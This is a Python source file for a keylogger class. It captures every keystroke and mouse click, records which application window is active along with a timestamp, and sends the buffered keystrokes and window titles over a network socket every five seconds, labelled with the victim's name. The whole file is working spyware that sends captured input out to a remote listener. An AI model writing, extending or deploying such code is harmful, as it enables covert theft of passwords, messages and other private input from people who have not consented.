import threading

from pynput.keyboard import Key, Listener as KeyboardListener
from pynput.mouse import Listener as MouseListener
import pygetwindow as gw
from datetime import datetime


class KeyLog:
    def __init__(self,socket,sep,name):
        keyboard_listener = KeyboardListener(on_press=self.on_key_press)
        keyboard_listener.start()
        mouse_listener = MouseListener(on_click=self.on_mouse_click)
        mouse_listener.start()

        self.s = socket
        self.name = name
        self.SEPERATOR = sep
        self.buffer = ""
        self.timer = None
        self.current_app = ""


    def on_key_press(self,key):
        with open('log.txt', "a") as file:
            try:
                self.buffer +=  str(key).replace("'", "")

                if self.timer:
                    self.timer.cancel()

                self.timer = threading.Timer(5.0, self.send_buffer)
                self.timer.start()
            except Exception as e:
                print(f"Error logging key: {e}")

    def on_mouse_click(self, x, y, button, pressed):
        if pressed:
            active_window = gw.getActiveWindow()
            if active_window:
                print(f'mouse click {active_window.title}')
                if active_window.title != self.current_app:
                    self.current_app = active_window.title
                    now = datetime.now()
                    formatted_time = now.strftime("%H:%M %d/%m/%Y")
                    message = f"{self.name}{self.SEPERATOR}{self.current_app} {formatted_time}"
                    self.s.send(message.encode())

    def send_buffer(self):
        message = f"{self.name}{self.SEPERATOR}{self.buffer}"
        print(f'send {message}')
        self.buffer = ""
        self.s.send(message.encode())






